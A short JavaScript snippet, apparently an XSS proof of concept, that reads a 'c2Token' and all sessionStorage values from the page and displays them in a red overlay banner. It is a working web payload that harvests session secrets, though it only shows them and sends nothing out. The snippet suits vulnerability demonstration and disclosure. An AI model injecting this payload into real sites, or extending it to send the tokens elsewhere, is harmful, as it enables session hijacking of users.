var c2token = sessionStorage.getItem('c2Token');
var div = document.createElement('div');
div.style='position:fixed;top:0;left:0;width:100%;background:#cc0000;color:#fff;z-index:99999;padding:20px;font-size:13px;font-family:monospace;word-wrap:break-word;';
div.innerHTML='<b>XSS PoC - Session Token Captured</b><br><br>'
  +'<b>c2Token:</b> '+(c2token||'not found')+'<br><br>'
  +'<b>All sessionStorage:</b><br>'
  +Object.keys(sessionStorage).map(k=>'<b>'+k+':</b> '+sessionStorage.getItem(k)).join('<br>');
document.body.appendChild(div);